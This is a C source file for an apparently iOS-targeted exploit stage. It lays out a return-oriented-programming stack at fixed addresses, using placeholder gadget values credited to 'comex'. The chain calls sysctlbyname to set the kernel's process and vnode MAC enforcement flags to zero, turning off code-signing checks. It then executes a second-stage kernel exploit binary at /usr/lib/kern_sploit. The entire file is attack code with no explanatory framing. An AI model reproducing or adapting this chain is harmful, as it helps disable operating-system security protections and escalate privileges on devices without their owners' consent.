#include <sys/types.h>
#include <sys/sysctl.h>
#include <unistd.h>

//comex's gadgets placeholders
#define CONFIG_K7               0xFEED0007
#define CONFIG_K11              0xFEED0011
#define CONFIG_K12              0xFEED0012

#define PIVOT_PLACEHOLDER       0xDEADB1F7
#define KERNEL_EXPLOIT_BIN      "/usr/lib/kern_sploit"

//forward declarations
unsigned int zero;
char kernel_exploit_bin[];
char* execve_params[];

struct stack
{
    unsigned int sratch[30];    //scratch space for sysctlbyname locals(it does sub sp, #76)
    unsigned int ropstack[(0x1654-0xC)/4 - 30];
    unsigned int r0r1r2r3[4];   //this needs to be at 0x11131654
};
//here we're at 0x1113000C
struct stack myROPStack={
    {0},
    {
        sysctlbyname,
        5,
        6,
        7,
        CONFIG_K7,                     //pop {r0-r3, pc}
        "security.mac.proc_enforce",
        0,
        0,
        &zero,
        CONFIG_K12,                     //blx r4; pop {r4, r5, r7, pc}
        4,
        0,
        0,
        CONFIG_K11,                     //pop {r4-r7, pc}
        sysctlbyname,
        0,
        0,
        0,
        CONFIG_K7,                     //pop {r0-r3, pc}
        "security.mac.vnode_enforce",
        0,
        0,
        &zero,
        CONFIG_K12,                     //blx r4; pop {r4, r5, r7, pc}
        4,
        0,
        0,
        CONFIG_K11,                     //pop {r4-r7, pc}
        execve,
        0,
        0,
        0,
        CONFIG_K7,                     //pop {r0-r3, pc}
        kernel_exploit_bin,
        &execve_params[0],
        &zero,
        0,
        CONFIG_K12,                     //blx r4; pop {r4, r5, r7, pc}
        0,
        0,
        0,
        CONFIG_K11,                     //pop {r4-r7, pc}
        0,
        0,
        0,
        0,
        },

    {
        0,
        0,
        &myROPStack.ropstack[3],   //ROP_STACK + 0xC
        PIVOT_PLACEHOLDER,
    }
};

char kernel_exploit_bin[] = KERNEL_EXPLOIT_BIN;
unsigned int zero = 0;
char* execve_params[] = {kernel_exploit_bin, NULL};

//we patch those exports later
int getpid(void){}
void unsetenv() {}
void launch_data_new_errno(){}
void setrlimit(){}
void _exit(int code){}
void audit_token_to_au32(){}
void launch_data_unpack(){}
void launch_data_dict_iterate(){}
void strlcpy(){}
void pthread_detach(){}
void stat(){}
